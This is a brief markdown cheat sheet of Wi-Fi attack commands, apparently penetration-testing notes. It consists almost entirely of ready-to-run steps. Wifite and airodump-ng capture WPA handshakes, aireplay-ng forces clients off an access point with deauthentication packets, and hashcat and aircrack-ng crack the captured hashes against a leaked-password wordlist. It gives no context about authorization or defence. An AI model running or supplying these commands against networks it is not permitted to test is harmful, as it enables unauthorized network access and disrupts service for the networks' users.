# Wireless attacks

## WPA cracking

### Wifite

```
sudo wifite -wpa -mac --skip-crack --wpat 60 --wpadt 10 --no-wps

# more info
https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2

# converting from handshake to crackable hash
https://hashcat.net/cap2hccapx/

.\hashcat64.exe -m 2500 .\handshakes\? ..\..\wordlists\rockyouplus.wordlist
```

### Aircrack-ng

```
airmon-ng start <interface>
airodump-ng <interface>
airodump-ng --bssid <bssid> -c <channel> --write <out> <interface>
aireplay-ng --deauth 10 -a <bssid of AP> <interface>
aircrack-ng <cap file> -w <wordlist>
```

